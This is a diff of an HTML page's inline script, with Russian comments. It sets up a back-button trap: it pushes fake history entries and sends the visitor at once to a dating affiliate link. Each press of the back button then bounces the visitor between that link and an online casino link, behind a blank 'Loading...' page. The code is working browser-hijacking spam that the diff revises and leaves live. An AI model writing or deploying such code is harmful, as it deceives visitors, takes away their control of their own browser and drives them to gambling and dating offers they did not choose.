@@ -7,42 +7,42 @@
 <script>
 
 const DATING = "https://tone.affomelody.com/click?pid=6350&offer_id=25";
+
 const CASINO = "https://onlinepnpbit.com/2Vi4txHl/";
 
 let state = 0;
 
-// создаем ловушку истории
-function trapHistory(){
-history.pushState({}, "", "#a");
-history.pushState({}, "", "#b");
-history.pushState({}, "", "#c");
+function pushHistory(){
+history.pushState({}, "", "#1");
+history.pushState({}, "", "#2");
+history.pushState({}, "", "#3");
 }
 
-// первый запуск
 window.onload = function(){
 
-trapHistory();
+pushHistory();
 
-// сразу редирект на дейтинг
-setTimeout(function(){
+// первый заход → дейтинг
 location.replace(DATING);
-},50);
 
 };
 
-// ловим кнопку назад
 window.onpopstate = function(){
+
+pushHistory();
 
 if(state === 0){
 
 state = 1;
-trapHistory();
+
+// назад → казино
 location.replace(CASINO);
 
 }else{
 
 state = 0;
-trapHistory();
+
+// снова назад → дейтинг
 location.replace(DATING);
 
 }
@@ -53,7 +53,7 @@ location.replace(DATING);
 
 </head>
 
-<body style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:120px">
+<body>
 
 Loading...
 
